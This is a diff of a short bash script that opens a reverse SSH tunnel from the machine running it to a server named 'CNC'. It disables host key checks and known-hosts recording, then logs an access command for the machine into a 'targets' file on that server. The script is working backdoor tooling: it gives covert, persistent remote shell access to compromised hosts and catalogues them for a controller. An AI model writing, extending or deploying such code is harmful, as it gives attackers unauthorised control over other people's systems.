@@ -1,11 +1,12 @@
 #!/bin/bash
 
-#TODO This shouldn't be static?
-CNC="osmc@10.0.0.145"
+CNC="test@test.com"
 
-ssh -o ExitOnForwardFailure=yes -o StrictHostKeychecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=5 -f -N -R 0:localhost:$1 $CNC 
+ssh -o BatchMode=yes -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -f -N -R $2:localhost:$1 $CNC 
 
 if [ "$?" -eq 0 ]; then
+  # Save command to access target on CNC server
+  ssh $CNC "echo ssh -p $2 `hostname -s`@localhost >> ~/targets "
   exit 0
 else
   echo connection failed
